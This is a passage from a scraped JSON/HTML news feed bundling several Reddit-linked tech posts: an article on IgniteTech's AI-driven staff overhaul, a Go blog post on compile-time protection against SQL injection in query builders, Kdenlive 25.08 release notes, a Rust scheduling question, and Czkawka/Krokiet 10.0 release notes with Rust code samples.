Instead, his message was direct: Everything would now revolve around AI. “We’re going to give a gift to each of you. And that gift is tremendous investment of time, tools, education, projects…to give you a new skill,” he explained. The company began reimbursing for AI tools and prompt-engineering classes, and even brought in outside experts to evangelize.\n\n\n\n</p><p>“Every single Monday was called ‘AI Monday,’” Vaughan said, with his mandate for staff that they could work only on AI. “You couldn’t have customer calls; you couldn’t work on budgets; you had to only work on AI projects.” He said this happened across the board, not just for tech workers, but also for sales, marketing, and everybody at IgniteTech. “That culture needed to be built. That was the key.”</p><p>This was a major investment, he added: 20% of payroll was dedicated to a mass-learning initiative, and it failed because of mass resistance, even sabotage. Belief, Vaughan discovered, is a hard thing to manufacture. “In those early days, we did get resistance, we got flat-out, ‘Yeah, I’m not going to do this’ resistance. And so we said goodbye to those people.”\n\n\n\n</p><h2>The pushback: Why didn’t they get on board?</h2><p>Vaughan was surprised to find it was often the technical staff, not marketing or sales, who dug in their heels. They were the “most resistant,” he said, voicing various concerns about what the AI couldn’t do, rather than focusing on what it could. The marketing and salespeople were enthused by the possibilities of working with these new tools, he added.\n\n\n\n</p><p>This friction is borne out by broader research. According to the 2025 <a href=\"https://writer.com/blog/enterprise-ai-adoption-survey/\" target=\"_blank\" rel=\"noopener\" aria-label=\"Go to https://writer.com/blog/enterprise-ai-adoption-survey/\">enterprise AI adoption report</a> by Writer, an agentic AI platform for enterprises, one in three workers say they’ve “actively sabotaged” their company’s AI rollout—a number that jumps to 41% of millennial and Gen Z employees. This can take the form of refusing to use AI tools, intentionally generating low-quality outputs, or avoiding training altogether. Many act out because of fears that AI will replace their jobs, while others are frustrated by lackluster AI tools or unclear strategy from leadership.\n\n\n\n</p><p>Writer’s chief strategy officer Kevin Chung told  the “big eye-opening thing” from this survey was the human element of AI resistance. “This sabotage isn’t because they’re afraid of the technology…It’s more like there’s so much pressure to get it right, and then when you’re handed something that doesn’t work, you get frustrated.” He added that Writer’s research shows that workers often don’t trust where their organizations are headed. “When you’re handed something that isn’t quite what you want, it’s very frustrating, so the sabotage kicks in, because then people are like, ‘Okay, I’m going to run my own thing. I’m going to go figure it out myself.’” You definitely don’t want this kind of “shadow IT” in an organization, he added.\n\n\n\n</p><p>Vaughan says he didn’t want to force anyone. “You can’t compel people to change, especially if they don’t believe.” He added that belief was really the thing he needed to recruit for. Company leadership ultimately realized they’d have to launch a massive recruiting effort for what became known as “AI innovation specialists.” This applied across the board, to sales, finance, marketing, everywhere. Vaughan said this time was “really difficult” as things inside the company were “upside down…We didn’t really quite know where we were or who we were yet.”</p><p>A couple of key hires helped, starting with the person who became IgniteTech’s chief AI officer, Thibault Bridel-Bertomeu. That led to a full reorganization of the company that Vaughan called “somewhat unusual.” Essentially, every division now reports into the AI organization, regardless of domain.\n\n\n\n</p><p>This centralization, Vaughan says, prevented duplication of efforts and maximized knowledge sharing—a common struggle in AI adoption, where Writer’s survey shows 71% of the C-suite at other companies say AI applications are being created in silos and nearly half report their employees have been left to “figure generative AI out on their own.”\n\n\n\n</p><p>In exchange for this difficult transformation, IgniteTech reaped extraordinary results. By the end of 2024, the company had launched two patent-pending AI solutions, including a platform for AI-based email automation (Eloquens AI), with a radically rebuilt team.\n\n\n\n</p><p>Financially, IgniteTech remained strong. Vaughan disclosed that the company, which he said is in the nine-figure revenue range, finished 2024 at “near 75% Ebitda”—all while completing a major acquisition, <a href=\"https://khoros.com/press-release/2025/ignitetech-acquires-khoros-to-transform-customer-connections-in-the-ai-answer-engine-era\" target=\"_blank\" rel=\"noopener\" aria-label=\"Go to https://khoros.com/press-release/2025/ignitetech-acquires-khoros-to-transform-customer-connections-in-the-ai-answer-engine-era\">Khoros</a>. “You multiply people…give people the ability to multiply themselves and do things at a pace,” he said, touting the company’s ability to build new customer-ready products in as little as four days, an unthinkable timeline in the old regime.\n\n\n\n</p><p>What does Vaughan’s story say for others? On one level, it’s a case study in the pain and payoff of radical change management. But his ruthless approach arguably addresses many challenges identified in the Writer survey: lack of strategy and investment, misalignment between IT and business, and the failure to engage champions who can unlock AI’s benefits.</p><h2>The ‘boy who cried wolf’ problem</h2><p>To be sure, IgniteTech is far from alone in wrestling with these challenges. <a href=\"https://www.linkedin.com/in/joshuawohle?miniProfileUrn=urn%3Ali%3Afsd_profile%3AACoAAAChTk0BAdrIaFcns7Wy5KxaYsu5-9ebcyo\" target=\"_blank\" rel=\"noopener\" aria-label=\"Go to https://www.linkedin.com/in/joshuawohle?miniProfileUrn=urn%3Ali%3Afsd_profile%3AACoAAAChTk0BAdrIaFcns7Wy5KxaYsu5-9ebcyo\">Joshua Wöhle</a> is the CEO of Mindstone, a firm that provides AI upskilling services to workforces, training hundreds of employees monthly at companies including Lufthansa, Hyatt, and NBA teams. He recently discussed the two approaches described by Vaughan—upskilling and mass replacement—in an appearance on <a href=\"https://www.linkedin.com/posts/joshuawohle_practicalai-futureofwork-aiaugmentation-activity-7360589505629679617-yayO/?utm_source=share&amp;utm_medium=member_desktop&amp;rcm=ACoAAAWZ-bwB7s4nmIudIt-yejBbl2J8W-cFoEo\" target=\"_blank\" rel=\"noopener\" aria-label=\"Go to https://www.linkedin.com/posts/joshuawohle_practicalai-futureofwork-aiaugmentation-activity-7360589505629679617-yayO/?utm_source=share&amp;utm_medium=member_desktop&amp;rcm=ACoAAAWZ-bwB7s4nmIudIt-yejBbl2J8W-cFoEo\"></a>.\n\n\n\n</p><p>Wöhle contrasted the recent examples of Ikea and Klarna, arguing the former’s example shows why it’s better to “reskill” existing employees. Klarna, a Swedish buy-now, pay-later firm, drew considerable publicity for a decision to reduce members of its customer support staff in a pivot to AI, only to <a href=\"https://finance.yahoo.com/news/firing-700-humans-ai-klarna-173029838.html\" target=\"_blank\" rel=\"noopener\" aria-label=\"Go to https://finance.yahoo.com/news/firing-700-humans-ai-klarna-173029838.html\">rehire for the same roles</a>. “We’re near the point where [AI is] more intelligent than most people doing knowledge work. But that’s precisely why augmentation beats automation,” Wöhle wrote on <a href=\"https://fortune.com/company/linkedin/\" target=\"_blank\" aria-label=\"Go to https://fortune.com/company/linkedin/\">LinkedIn</a>.\n\n\n\n</p><p>A representative for Klarna told  the company did not lay off employees but has instead adopted several approaches to its customer service, which is managed by outsourced customer service providers who are paid according to the volume of work required. The launch of an AI customer service assistant reduced the workload by the equivalent of 700 full-time agents—from roughly 3,000 to 2,300—and the third-party providers redeployed those 700 workers to other clients, according to Klarna. Now that the AI customer service agent is “handling more complex queries than when we launched,” Klarna says, that number has fallen to 2,200.&nbsp;Klarna says its contractor has rehired just two&nbsp;people in a pilot program designed to combine highly trained human support staff with AI to deliver outstanding customer service.&nbsp;\n\n\n\n</p><p>In an interview with , Wöhle said one client of his has been very blunt with his workers, ordering them to dedicate all Fridays to AI retraining, and if they didn’t report back on any of their work, they were invited to leave the company. He said it can be “kinder” to dismiss workers who are resistant to AI: “The pace of change is so fast that it’s the kinder thing to force people through it.” He added that he used to think that if he got all workers to really love learning, then that could help Mindstone make a real difference, but he discovered after training literally thousands of people that “most people hate learning. They’d avoid it if they can.”\n\n\n\n</p><p>Wöhle attributed much of the AI resistance in the workforce to a “boy who cried wolf” problem from the tech sector, citing NFTs and blockchain as technologies that were billed as revolutionary but “didn’t have the real effect” that tech leaders promised. “You can’t really blame them” for resisting, he said. Most people “get stuck because they think from their work flow first,” he added, and they conclude AI is overhyped because they want AI to fit into their old way of working. “It takes a lot more thinking and a lot more kind of prodding for you to change the way that you work,” but once you do, you see dramatic increases. A human can’t possibly keep five call transcripts in their head while you’re trying to write a proposal to a client, he offers, but AI can.</p><p>Ikea echoed Wöhle when reached for comment, saying that its “people-first AI approach focuses on augmentation, not automation.” A spokesperson said Ikea is using AI to automate tasks, not jobs, freeing up time for value-added, human-centric work.\n\n\n\n</p><p>The Writer report notes that companies with formal AI strategies are far more likely to succeed, and those who heavily invest in AI outperform their peers by a large margin. But as Vaughan’s experience shows, investment without belief and buy-in can be wasted energy. “The culture needed to be built. Ultimately, we ended up having to go out and recruit and hire people that were already of the same mind. Changing minds was harder than adding skills.”\n\n\n\n</p><p>For Vaughan, there’s no ambiguity. Would he do it again? He doesn’t hesitate: He’d rather endure months of pain and build a new, AI-driven foundation from scratch than let an organization drift into irrelevance. “This is not a tech change. It is a cultural change, and it is a business change.” He said he doesn’t recommend that others follow his lead and swap out 80% of their staff. “I do not recommend that at all. That was not our goal. It was extremely difficult.” But at the end of the day, he added, everybody’s got to be in the same boat, rowing in the same direction. Otherwise, “we don’t get where we’re going.”\n</p>","contentLength":11002,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1mtptiv/this_ceo_laid_off_nearly_80_of_his_staff_because/"},{"title":"Injection-proof SQL builders in Go","url":"https://oblique.security/blog/injection-proof-sql/","date":1755532160,"author":"/u/ericchiang","guid":231796,"unread":true,"content":"<p>A Go product that uses SQL will inevitably implement some higher level logic on top of <a href=\"https://pkg.go.dev/database/sql\">database/sql</a>. There are just too many cases where a single string with a fixed set of arguments isn’t flexible enough. Using different database flavors for dev and prod which take different placeholders ( vs ). Inserting <a href=\"https://stackoverflow.com/a/21112176\">multiple rows</a> in a single statement. Performing the same query with different WHERE conditions.</p><p>While builders are often necessary for development, they’re also absolutely terrifying for security.</p><p>Sure, Go has built-in <a href=\"https://go.dev/doc/database/sql-injection\">parameterized values</a> for input variables, but what if we’re trying to specify column, row, or table names? Most packages will happily accept arbitrary input in these fields and run it directly against your database.</p><pre tabindex=\"0\" data-language=\"go\"><code></code></pre><p>When building Oblique, we weren’t thrilled with the idea of accidentally introducing a 90s vulnerability into a security product built in 2025. If a customer trusts Oblique to manage authorization in their environment, we should do more than hope our new backend hire doesn’t misuse a Go API.</p><p>There turns out to be a clever trick with the Go type system to ensure an argument is free from dynamic input. That way, we can constrain the builder’s inputs rather than sanitize or detect after the fact.</p><p>Consider the following package:</p><pre tabindex=\"0\" data-language=\"go\"><code></code></pre><p>Because  is private, there’s no way for an external package to create a variable of that type.</p><p>This should make it impossible for another package to call , except for one notable exception. Go is relatively strict on mixing types. You can’t add an  to a  or even an  to an . To compensate, Go <a href=\"https://go.dev/blog/constants\">constants</a> allow programs to define untyped values whose type is inferred when they’re used in some context that requires one. That’s why you can do something like the following:</p><pre tabindex=\"0\" data-language=\"go\"><code></code></pre><p>Rather than explicitly typing every number:</p><pre tabindex=\"0\" data-language=\"go\"><code></code></pre><p>The constants  and  are coerced to a <a href=\"https://pkg.go.dev/time#Duration\"></a> by being multiplied by .</p><p>Let’s go back to our earlier example. While another package can’t create a variable with the  type, it is possible to pass a constant! This will get typed as  simply by being used as an argument value.</p><pre tabindex=\"0\" data-language=\"go\"><code></code></pre><p>We can use this observation to force callers to only pass constants to our APIs, which by definition will never be dependent on dynamic input. You can’t construct a constant using  or other string concatenation that depends on a live variable.</p><p>Here’s a full example builder that uses private string types for column, row, and table names:</p><pre tabindex=\"0\" data-language=\"go\"><code></code></pre><p>With this package, you can still write the basic builder logic you’d expect:</p><pre tabindex=\"0\" data-language=\"go\"><code></code></pre><p>But, if you ever accidentally depend on a string variable, the program refuses to compile!</p><pre tabindex=\"0\" data-language=\"go\"><code></code></pre><p>Helpers like  still allow other packages to dynamically construct the set of rows to select, but guarantee their values trace back to constants and aren’t dependent on user controlled values.</p><p>Smart engineers at prominent companies accidentally write vulnerabilities like this all the time. As a codebase gets bigger, it’s just not possible to depend on human review as the security check. Nor is this restricted to SQL. Similar issues with <a href=\"https://github.com/advisories/GHSA-77gc-fj98-665h\">JWT libraries</a> and <a href=\"https://go.dev/blog/osroot\">archive unpacking</a> are routine when APIs make it easy to accidentally do the wrong thing.</p><p>If you are building a package with security implications, it should be as hard as possible (if not impossible) for users to do something insecure. For SQL builders, what’s better than insecure code not compiling at all?</p>","contentLength":3346,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1mtpthj/injectionproof_sql_builders_in_go/"},{"title":"Kdenlive 25.08 released with over 300 commits of bug fixes and polishing","url":"https://kdenlive.org/news/releases/25.08.0/","date":1755531322,"author":"/u/f_r_d","guid":231794,"unread":true,"content":"<p>The Kdenlive team is happy to announce the release of version 25.08.0 packed with over 300 commits and fixing more than 15 crashes. This release has no major shiny new features, just a ton of bug fixes and lots of polishing to give you a pleasant editing experience in the summer heat.</p><p>Redesign of the audio mixer bringing levels with clearer visuals and thresholds. We also did some code refactoring and cleanup. This change fixes issues with HiDPI displays with fractional scaling.</p><p>This release the titler received some much needed love like improved  and  support with ability to move and resize items, added center resize with , and renamed the  tab to  and moved the templates dropdown to it:</p><ul><li>Added timecode widget with ability to drag to seek in the Titler,<em>(Shift+drag for 1 frame, CTRL+drag for fast seek)</em>\nFix issues when resizing images would also moves them</li><li>Fix titler selection on create / resize object</li><li>Fixed an issue where the titler's panel width was consuming half the screen</li><li>Save and restore the panel width on reopening</li><li>Fix title thumbnail not updating in timeline after change</li></ul><p>Improved Scope styling by using system palettes for better theme integration as well as bug fixes in artifacts on high zoom level and paint modes. Compare the old styling on the left side with the new styling on the right:</p><h2>Subtitles and Speech-To-Text</h2><ul><li>Require shift + drag of a subtitle clip to create a new layer</li><li>Make the  resizable to adapt to lower resolutions</li><li>Fix crash dropping media file on subtitle track</li><li>Subtitle code refactoring</li><li>Fix subtitle layer name width</li><li>Fix subtitles showing on the top layer rather than appearing in lower layers on project loading.</li><li>Fix Whisper STT using Python 3.13</li><li>Whisper: disable translation when the Turbo model is selected</li><li>Fix Vosk STT producing bad subtitles</li></ul><p>Guides and Markers got a major overhaul this release to improve the project organization.</p><ul><li>Clicking a marker in the list now always selects it in the timeline</li><li>When adding a new marker, it’s automatically selected in the guides list</li><li>Selecting a guide in the timeline also highlights it in the guides list</li><li>New option to show thumbnails in the markers list dialog</li><li>Added a “Show markers for all clips in the project” toggle to display markers in other sequences</li><li>Consistently use bookmark icon for guides/markers</li><li>Improves  integration</li><li>Render dialog now updates correctly when sequence offsets change</li><li>Sequence timecode offsets now propagate to the timeline ruler, monitor, and guides list</li><li>Guides are correctly adjusted when changing project profile to match a clip profile</li></ul><p>Some highlights include: improve icons, automatically convert typed timecodes to links when pressing enter, fix pasting text with multiple lines, notes can create guides and markers directly, and the widget has improved icons and text handling</p><ul><li>Add handle to rotate an item using the  in the monitor</li><li>Fix rotoscoping shape not matching selection in monitor</li><li>Fix monitor overlay for  and  effects</li><li>Fix Transform monitor tool resizing when rotated</li><li>Fix pattern/lines overlay of the project monitor misaligning if clip changes while zoomed in</li><li>Improved monitor snapping: added back snapping when resizing for non-rotated frames, snapping when moving a rotated frame, and added snapping support for all edges when moving instead of only top-left</li><li>Change Timecode color of active Monitor</li><li>Make sure playhead is always on top of indicators</li><li>Make transform effect monitor grid setting apply to both monitors</li><li>Fix keyframe in monitor not correctly reported on clip selection</li><li>Adjust monitor timecode for sequence clips with timecode offset</li></ul><p>We've added work on rendering, encoding, decoding, and transcoding such as:</p><ul><li>Added  option in the  in preparation for future hardware acceleration features</li></ul><ul><li>Added power management option to disable sleep while rendering and playing</li><li>Added Nvidia 10 bit x265 encoding</li><li>Added 10 bit export profiles in the render dialog <em>(Do note that it will be converted to 8 bit when using compositing or non avfilter effects)</em></li><li>Fix image sequence render incorrectly reported as failed</li><li>Ensure audio checkbox is disabled if rendering to an image sequence</li><li>Fix possible locale issue on render in Mac/Windows</li><li>Added ability to show log files in render dialog  tab</li><li>Added option to keep log files in the render dialog options</li><li>Replace AV1 profile with faster SVT-AV1 and added preset option to control quality and speed</li><li>AddedSVT-AV1 to codecs which use  option</li><li>Fix canceling a render would leave Kdenlive in an unstable state</li><li>Warn when exiting Kdenlive when render jobs are running, allow to terminate all jobs</li><li>Update render dialog guides when sequence offset changes</li><li>Display timecode offset in render dialog</li></ul><ul><li>Reduced memory consumption of the background removal (SAM2) feature</li><li>Added more code tests to improve stability</li><li>Improved packaging in MacOS, Windows, Snaps and Flatpak</li><li>Cleanup plugins configuration page</li><li>Fix SAM2 use system packages hidden</li><li>Allow installing specific CUDA version for Whisper and SAM2</li><li>Fixes to undo/redo operations</li><li>OpentimelineIO (OTIO) fixes</li><li>Drop mediainfo dependency now that we can directly read timecode from MLT</li></ul><ul><li>MacOS: Allow opening project files by double click ()</li><li>Windows: Typewriter effect crash in Titler</li><li>AppImage: Fix missing / corrupted font making App unusable on Ubuntu 24.04</li></ul><p>The team will be in  this September for two events. First, the Kdenlive Sprint which will include a community meetup on the 4th of September (stay tuned for more details) and on the 7th of September we'll be at <a href=\"https://akademy.kde.org/2025/\">Akademy</a>, where Jean-Baptiste will give a <a href=\"https://conf.kde.org/event/9/contributions/286/\">talk about our fundraiser experience</a>. Join us!</p><p>Kdenlive relies on its community, your help is always welcome. You can contribute by :</p><ul><li>Promote Kdenlive in your local community</li></ul><p>You can also support us by considering a <a href=\"https://kdenlive.org/fund/\">donation</a> that will help Kdenlive's development.</p>","contentLength":5707,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1mtpflw/kdenlive_2508_released_with_over_300_commits_of/"},{"title":"Is calling tokio::sleep() with a duration of one week a bad idea?","url":"https://www.reddit.com/r/rust/comments/1mtond5/is_calling_tokiosleep_with_a_duration_of_one_week/","date":1755529608,"author":"/u/dmkolobanov","guid":231866,"unread":true,"content":"<p>I’ve created a web app that generates some temporary files during its processing. I’m thinking of creating a worker thread that will delete every file in the temp folder, then call  with a duration of one week. It’ll run alongside the main application with , and the worker thread will simply never exit under normal circumstances.</p><p>Anyways, is there anything wrong with this approach? Is there a better way to schedule tasks like this? I know cron is an option, but my understanding of it is limited. Plus, this app will run in a Docker container, and it seems like Docker + cron is even more of a headache than regular cron.</p><p>Edit: For a little more context, this is an app for analyzing x-ray images that’ll be used at the small manufacturing company I work at. Everything will be hosted on local, on-premises servers, and the only user is the guy who runs our x-ray machine lol. Not that I want to excuse bad programming, it’s just that the concerns are a little different when it’s not consumer-facing software. Anyways, once the analysis is generated (which includes some contrast changes and circles around potential defects located by the x-ray), and the results are displayed on a web page, the images are no longer needed. The original image is archived, and there’s a lookup feature that simply re-runs the analysis routine on the raw image and re-generates the result images. All I’d like is to make sure there’s not a glut of these images building up long after they’re needed.</p>","contentLength":1506,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Czkawka / Krokiet 10.0: cleaning duplicates, unifying features and a handful of Rust related statistics","url":"https://www.reddit.com/r/rust/comments/1mtomwh/czkawka_krokiet_100_cleaning_duplicates_unifying/","date":1755529579,"author":"/u/krutkrutrar","guid":233219,"unread":true,"content":"<p>After a little less than six months, I’m releasing a new version of my three distinct (yet similar) duplicate-finding programs today.</p><p>The list of fixes and new features may seem random, and in fact it is, because I tackled them in the order in which ideas for their solutions came to mind. I know that the list of reported issues on GitHub is quite long, and for each user their own problem seems the most important, but with limited time I can only address a small portion of them, and I don’t necessarily pick the most urgent ones.</p><p>Interestingly, this version is the largest so far (at least if you count the number of lines changed). Krokiet now contains almost all the features I used in the GTK version, so it looks like I myself will soon switch to it completely, setting an example for other undecided users (as a reminder, the GTK version is already in maintenance mode, and I focus there exclusively on bug fixes, not adding new features).</p><p>As usual, the binaries for all three projects (, , and ), along with a short legend explaining what the individual names refer to and where these files can be used, can be found in the releases section on GitHub — <a href=\"https://github.com/qarmin/czkawka/releases\">https://github.com/qarmin/czkawka/releases</a></p><p>One of the random errors that sometimes occurred due to the user, sometimes my fault, and sometimes — for example — because a power outage shut down the computer during operation, was a mysterious crash at the start of scanning, which printed the following information to the terminal:</p><pre><code>memory allocation of 201863446528 bytes failed </code></pre><p>Cache files that were corrupted by the user (or due to random events) would crash when loaded by the bincode library. Another situation, producing an error that looked identical, occurred when I tried to remove cache entries for non-existent or unavailable files using an incorrect struct for reading the data (in this case, the fix was simply changing the struct type into which I wanted to decode the data).</p><p>This was a rather unpleasant situation, because the application would crash for the user during scanning or when pressing the appropriate button, leaving them unsure of what to do next. Bincode provides the possibility of adding a memory limit for data decoding. The fix required only a few lines of code, and that could have been the end of it. However, during testing it turned out to be an unexpected breaking change—data saved with a memory-limited configuration cannot be read with a standard configuration, and vice versa.</p><pre><code>use std::collections::BTreeMap; use bincode::{serialize_into, Options}; const MEMORY_LIMIT: u64 = 1024 * 1024 * 1024; // 1 GB fn main() { let rands: Vec&lt;u32&gt; = (0..1).map(|_| rand::random::&lt;u32&gt;()).collect(); let btreemap: BTreeMap&lt;u32, Vec&lt;u32&gt;&gt; = rands .iter() .map(|&amp;x| (x % 10, rands.clone())) .collect(); let options = bincode::DefaultOptions::new().with_limit(MEMORY_LIMIT); let mut serialized: Vec&lt;_&gt; = Vec::new(); options.serialize_into(&amp;mut serialized, &amp;btreemap).unwrap(); println!(\"{:?}\", serialized); let mut serialized2: Vec&lt;_&gt; = Vec::new(); serialize_into(&amp;mut serialized2, &amp;btreemap).unwrap(); println!(\"{:?}\", serialized2); } [1, 1, 1, 252, 53, 7, 34, 7] [1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 53, 7, 34, 7] </code></pre><p>The above code, when serializing data with and without the limit, produces two different results, which was very surprising to me because I thought that the limiting option applied only to the decoding code, and not to the file itself (it seems to me that most data encoding libraries write only the raw data to the file).</p><p>So, like it or not, this version (following the path of its predecessors) has a cache that is incompatible with previous versions. This was one of the reasons I didn’t implement it earlier — I had tried adding limits only when reading the file, not when writing it (where I considered it unnecessary), and it didn’t work, so I didn’t continue trying to add this functionality.</p><p>I know that for some users it’s probably inconvenient that in almost every new version they have to rebuild the cache from scratch, because due to changed structures or data calculation methods, it’s not possible to simply read old files. So in future versions, I’ll try not to tamper too much with the cache unless necessary (although, admittedly, I’m tempted to add a few extra parameters to video files in the next version, which would force the use of the new cache).</p><p>An alternative would be to create a built-in tool for migrating cache files. However, reading arbitrary external data without memory limits in place would make such a tool useless and prone to frequent crashes. Such a tool is only feasible from the current version onward, and it may be implemented in the future.</p><p>To match the feature set currently available in Czkawka, I decided to try to implement the missing translations, which make it harder for some users, less proficient in English, to use the application.</p><p>One might think that since Slint itself is written in Rust, using the Fluent library inside it, which is also written in Rust, would be an obvious and natural choice. However, for various reasons, the authors decided that it’s better to use probably the most popular translation tool instead — gettext, which, however, complicates compilation and almost makes cross-compilation impossible (the issue aims to change this situation — <a href=\"https://github.com/slint-ui/slint/issues/3715\">https://github.com/slint-ui/slint/issues/3715</a>).</p><p>Without built-in translation support in Slint, what seemed like a fairly simple functionality turned into a tricky puzzle of how to implement it best. My goal was to allow changing the language at runtime, without needing to restart the entire application.</p><p>Ultimately, I decided that the best approach would be to create a singleton containing all the translation texts, in a style like this:</p><pre><code>export global Translations { in-out property &lt;string&gt; ok_button_text: \"Ok\"; in-out property &lt;string&gt; cancel_button_text: \"Cancel\"; ... } </code></pre><pre><code>export component PopupBase inherits PopupWindow { in-out property &lt;string&gt; ok_text &lt;=&gt; Translations.ok_button_text; ... } </code></pre><p>then, when changing the language or launching the application, all these attributes are updated in such a way:</p><pre><code>app.global::&lt;Callabler&gt;().on_changed_language(move || { let app = a.upgrade().unwrap(); let translation = app.global::&lt;Translations&gt;(); translation.set_ok_button_text(flk!(\"ok_button\").into()); translation.set_cancel_button_text(flk!(\"cancel_button\").into()); ... }); </code></pre><p>With over 200 texts to translate, it’s very easy to make a mistake or leave some translations unlinked, which is why I rely on Python helper scripts that verify everything is being used.</p><p>This adds more code than if built-in support for fluent-rs existed and could be used directly, similar to how gettext translations currently work. I hope that something like this will be implemented for Fluent soon:</p><pre><code>export component PopupBase inherits PopupWindow { in-out property &lt;string&gt; ok_text: u/tr(\"ok_button\"); ... } </code></pre><p>Regarding the translations themselves, they are hosted and updated on Crowdin — <a href=\"https://crowdin.com/project/czkawka\">https://crowdin.com/project/czkawka</a> — and synchronized with GitHub from time to time. For each release, several dozen phrases are updated, so I’m forced to use machine translation for some languages. Not all texts may be fully translated or look as they should, so feel free to correct them if you come across any mistakes.</p><p>The main goal of this version was to reduce the feature gaps between Czkawka (GUI) and Krokiet, so that I could confidently recommend Krokiet as a viable alternative. I think I largely succeeded in this area.</p><p>During this process, it often turned out that implementing the same features in Slint is much simpler than it was in the GTK version. Take sorting as an example. On the GTK side, due to the lack of better-known solutions (there probably are some, but I’ve lived until now in complete ignorance, which makes my eyes hurt when I look at the final implementation I once made), to sort a model, I would get an iterator over it and then iterate through each element one by one, collecting the TreeIters into a vector. Then I would extract the data from a specific column of each row and sort it using bubble sort within that vector.</p><pre><code>fn popover_sort_general&lt;T&gt;(tree_view: &amp;gtk4::TreeView, column_sort: i32, column_header: i32) where T: Ord + for&lt;'b&gt; glib::value::FromValue&lt;'b&gt; + 'static + Debug, { let model = get_list_store(tree_view); if let Some(curr_iter) = model.iter_first() { assert!(model.get::&lt;bool&gt;(&amp;curr_iter, column_header)); // First item should be header assert!(model.iter_next(&amp;curr_iter)); // Must be at least two items loop { let mut iters = Vec::new(); let mut all_have = false; loop { if model.get::&lt;bool&gt;(&amp;curr_iter, column_header) { assert!(model.iter_next(&amp;curr_iter), \"Empty header, this should not happens\"); break; } iters.push(curr_iter); if !model.iter_next(&amp;curr_iter) { all_have = true; break; } } if iters.len() == 1 { continue; // Can be equal 1 in reference folders } sort_iters::&lt;T&gt;(&amp;model, iters, column_sort); if all_have { break; } } } } fn sort_iters&lt;T&gt;(model: &amp;ListStore, mut iters: Vec&lt;TreeIter&gt;, column_sort: i32) where T: Ord + for&lt;'b&gt; glib::value::FromValue&lt;'b&gt; + 'static + Debug, { assert!(iters.len() &gt;= 2); loop { let mut changed_item = false; for idx in 0..(iters.len() - 1) { if model.get::&lt;T&gt;(&amp;iters[idx], column_sort) &gt; model.get::&lt;T&gt;(&amp;iters[idx + 1], column_sort) { model.swap(&amp;iters[idx], &amp;iters[idx + 1]); iters.swap(idx, idx + 1); changed_item = true; } } if !changed_item { return; } } } </code></pre><p>Over time, I’ve realized that I should have wrapped the model management logic earlier, which would have made reading and modifying it much easier. But now, it’s too late to make changes. On the Slint side, the situation is much simpler and more “Rust-like”:</p><pre><code>pub(super) fn sort_modification_date(model: &amp;ModelRc&lt;MainListModel&gt;, active_tab: ActiveTab) -&gt; ModelRc&lt;MainListModel&gt; { let sort_function = |e: &amp;MainListModel| { let modification_date_col = active_tab.get_int_modification_date_idx(); let val_int = e.val_int.iter().collect::&lt;Vec&lt;_&gt;&gt;(); connect_i32_into_u64(val_int[modification_date_col], val_int[modification_date_col + 1]) }; let mut items = model.iter().collect::&lt;Vec&lt;_&gt;&gt;(); items.sort_by_cached_key(&amp;sort_function); let new_model = ModelRc::new(VecModel::from(items)); recalculate_small_selection_if_needed(&amp;new_model, active_tab); return new_model; } </code></pre><p>It’s much shorter, more readable, and in most cases faster (the GTK version might be faster if the data is already almost sorted). Still, a few oddities remain, such as:</p><ul><li> —to generalize the model for different tools a bit, for each row in the scan results, there are vectors containing numeric and string data. The amount and order of data differs for each tool, so it’s necessary to fetch from the current tab where the needed data currently resides</li><li> as the name suggests, it combines two i32 values into a u64. This is a workaround for the fact that Slint doesn’t yet support 64-bit integers (though I’m hopeful that support will be added soon).</li><li><strong>recalculate_small_selection_if_needed —</strong> due to the lack of built-in widgets with multi-selection support in Slint (unlike GTK), I had to create such a widget along with all the logic for selecting items, modifying selections, etc. It adds quite a bit of extra code, but at least I now have more control over selection, which comes in handy in certain situations</li></ul><p>Another useful feature that already existed in Czkawka is the ability to start a scan, along with a list of selected folders, directly from the CLI. So now, running</p><pre><code>krokiet . Desktop -i /home/rafal/Downloads -e /home/rafal/Downloads/images </code></pre><p>will start scanning for files in three folders with one excluded (of course, only if the paths exist — otherwise, the path will be ignored). This mode uses a separate configuration file, which is loaded when the program is run with command-line arguments (configurations for other modes are not overwritten).</p><p>Since some things are easier to implement in Krokiet, I added several functions in this version that were missing in Czkawka:</p><ul><li>Remembering window size and column widths for each screen</li><li>The ability to hide text on icons (for a more compact UI)</li><li>Dark and light themes, switchable at runtime</li><li>Disabling certain buttons when no items are selected</li><li>Displaying the number of items queued for deletion</li></ul><p>Following the end of Snap support on Linux in the previous version, due to difficulties in building them, it’s now time to drop AppImage as well.</p><p>The main reasons for discontinuing AppImage are the nonstandard errors that would appear during use and its limited utility beyond what regular binary files provide.</p><p>Personally, I’m a fan of the AppImage format and use it whenever possible (unless the application is also available as a Flatpak or Snap), since it eliminates the need to worry about external dependencies. This works great for applications with a large number of dependencies. However, in Czkawka, the only dependencies bundled were GTK4 libraries — which didn’t make much sense, as almost every Linux distribution already has these libraries installed, often with patches to improve compatibility (for example, Debian patches: <a href=\"https://udd.debian.org/patches.cgi?src=gtk4&amp;version=4.18.6%2Bds-2\">https://sources.debian.org/src/gtk4/4.18.6%2Bds-2/debian/patches/series/</a>).</p><p>It would make more sense to bundle optional libraries such as ffmpeg, libheif or libraw, but I didn’t have the time or interest to do that. Occasionally, some AppImage users started reporting issues that did not appear in other formats and could not be reproduced, making them impossible to diagnose and fix.</p><p>Additionally, the plugin itself (<a href=\"https://github.com/linuxdeploy/linuxdeploy-plugin-gtk\">https://github.com/linuxdeploy/linuxdeploy-plugin-gtk</a>) used to bundle GTK dependencies hadn’t been updated in over two years. Its authors did a fantastic job creating and maintaining it in their free time, but a major issue for me was that it wasn’t officially supported by the GTK developers, who could have assisted with the development of this very useful project.</p><p>Some users pointed out that deleting or copying files from within the application is time-consuming, and there is no feedback on progress. Additionally, during these operations, the entire GUI becomes unresponsive until the process finishes.</p><p>The problem stems from performing file operations in the same thread as the GUI rendering. Without interface updates, the system considers the application unresponsive and may display an os window prompting the user to kill it.</p><p>The solution is relatively straightforward — simply move the computations to a separate thread. However, this introduces two new challenges: the need to stop the file-processing task and to synchronize the state of completed operations with the 